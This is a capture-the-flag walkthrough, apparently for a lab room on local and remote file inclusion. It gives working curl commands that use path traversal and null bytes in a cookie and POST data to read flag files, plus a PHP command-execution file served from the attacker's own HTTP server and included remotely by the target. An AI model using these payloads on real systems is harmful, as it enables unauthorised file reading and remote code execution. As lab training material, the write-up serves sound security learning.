* Challenges
** Flag 1
On the right hand side of Firefox open the =menu > Web Developer >
Inspector=. In the html source code find the form tag and change the
method from =GET= to =POST=. Then on the actual web page fill =/etc/flag1= in
in the form and press the include button. This should reveal the flag.

** Flag 2
From the hint it is clear that we have to edit the cookie to find the
flag. To inspect the cookie run:

#+begin_src sh
curl -v http://10.10.124.167/challenges/chall2.php
#+end_src

and find the cookie among the header of the output. It has the value
=Cookie: THM=Guest=. The obvious thing is to try and change the value
=Admin=:

#+begin_src sh
  curl -H 'Cookie: THM=Admin' http://10.10.124.167/challenges/chall2.php -o flag2.txt
#+end_src

which reveals the admin page. Since there is not input form on this
page and it is a LFI room the next thing to try is to change the value
of the cookie to the file path to the flag. After a few tries the
correct value was found:

#+begin_src sh
  curl -H 'Cookie: THM=../../../../etc/flag2%00' http://10.10.124.167/challenges/chall2.php -o flag2.txt
#+end_src

Locate the flag at the end of the file =flag2.txt=.

** Flag 3
The url input is filtered, everything that is not a-z is filtered
out. To get around this change the method from get to =GET= to =POST=
and set the data to be posted to =/etc/flag3%00=. The =%00= is
necessary to prevent the =.php= from being added at the end as
explained previously in the room.

#+begin_src sh
  curl -v http://ip/challenges/chall3.php -X  POST -d 'file=/etc/flag3%00' -o flag3.txt
#+end_src

Locate the flag at the end of the file =flag3.txt=.

** Playground
Since this is a RFI exercise we first need to create a =.php= file
that will execute the command we want, =hostname=.

#+begin_src sh
  echo "<?PHP echo system('hostname') ?>" > rfi.php
#+end_src

Next we need a simple server that will host our file. The simplest way
to do this is with python.

#+begin_src sh
  python -m http.server &
#+end_src

And finally add the file as a parameter in the url to get the hostname:

#+begin_src sh
  curl http://10.10.124.167/playground.php?file=http://10.10.95.70:8000/rfi.php
#+end_src

Note: the IP of the remote file is the IP of the attackbox and for the
port number see the output of the python command. The port number
defaults to 8000 but can be different.
